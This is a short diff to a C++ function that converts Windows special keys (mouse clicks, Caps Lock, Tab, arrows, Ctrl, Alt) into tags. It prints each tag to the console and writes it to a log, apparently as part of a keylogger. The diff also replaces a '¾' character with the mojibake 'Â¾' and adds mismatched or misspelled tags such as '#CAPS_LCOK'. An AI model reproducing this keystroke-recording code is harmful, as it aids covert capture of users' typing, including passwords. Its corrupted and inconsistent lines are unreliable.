@@ -32,7 +32,7 @@ bool SpecialKeys(int S_Key) {
 		cout << "\n";
 		LOG("\n");
 		return true;
-	case '¾':
+	case 'Â¾':
 		cout << ".";
 		LOG(".");
 		return true;
@@ -47,6 +47,38 @@ bool SpecialKeys(int S_Key) {
 	case VK_RBUTTON:
 		cout << "#R_CLICK#";
 		LOG("#R_CLICK#");
+		return true;
+	case VK_CAPITAL:
+		cout << "#CAPS_LOCK#";
+		LOG("#CAPS_LCOK");
+		return true;
+	case VK_TAB:
+		cout << "#TAB";
+		LOG("#TAB");
+		return true;
+	case VK_UP:
+		cout << "#UP";
+		LOG("#UP_ARROW_KEY");
+		return true;
+	case VK_DOWN:
+		cout << "#DOWN";
+		LOG("#DOWN_ARROW_KEY");
+		return true;
+	case VK_LEFT:
+		cout << "#LEFT";
+		LOG("#LEFT_ARROW_KEY");
+		return true;
+	case VK_RIGHT:
+		cout << "#RIGHT";
+		LOG("#RIGHT_ARROW_KEY");
+		return true;
+	case VK_CONTROL:
+		cout << "#CONTROL";
+		LOG("#CONTROL");
+		return true;
+	case VK_MENU:
+		cout << "#ALT";
+		LOG("#ALT");
 		return true;
 	default: 
 		return false;
